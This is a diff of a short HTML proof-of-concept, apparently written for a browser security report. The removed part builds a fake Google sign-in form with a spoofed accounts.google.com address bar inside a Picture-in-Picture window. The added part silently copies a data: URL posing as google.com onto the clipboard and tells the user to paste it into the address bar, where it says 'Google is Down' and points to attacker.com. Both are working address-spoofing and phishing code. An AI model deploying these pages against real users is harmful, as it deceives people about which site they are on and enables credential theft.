@@ -1,37 +1,17 @@
-<title>YouTube Player</title>
-<style>
-    #spoofContent { display: none; }
-    .address-bar {
-        background: #202124;
-        color: white;
-        padding: 10px;
-        font-family: monospace;
-        font-size: 14px;
-    }
-</style>
-
-<button onclick="openYouTubeSpoof()" style="padding: 15px; font-size: 16px;">
-    🎬 Open YouTube Player
-</button>
-
-<div id="spoofContent">
-    <div class="address-bar">https://accounts.google.com</div>
-    <div style="padding: 20px;">
-        <h2>Google Sign In</h2>
-        <p>Sign in to continue to YouTube</p>
-        <input type="email" placeholder="Email or phone" style="width: 100%; padding: 8px; margin: 5px 0;">
-        <button style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none;">Next</button>
-    </div>
-</div>
+<body><h1><br><a href=javascript:start()>Click Here</a> then Paste what you have copied in the address bar<br>
 
 <script>
-    async function openYouTubeSpoof() {
-        const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 450,
-            height: 350
-        });
-        
-        // Direct content injection - ala Laporan 4
-        pipWindow.document.body.innerHTML = spoofContent.innerHTML;
-    }
+
+async function setClipboard(text) {
+  const type = "text/html";
+  const blob = new Blob([text], { type });
+  const data = [new ClipboardItem({ [type]: blob })];
+  await navigator.clipboard.write(data);
+}
+
+function start(){
+
+var textToCopy = `data://google.com/,Google%20is%20Down%0aPlease%20Visit%20https://attacker.com`;
+setClipboard(textToCopy);
+}
 </script>
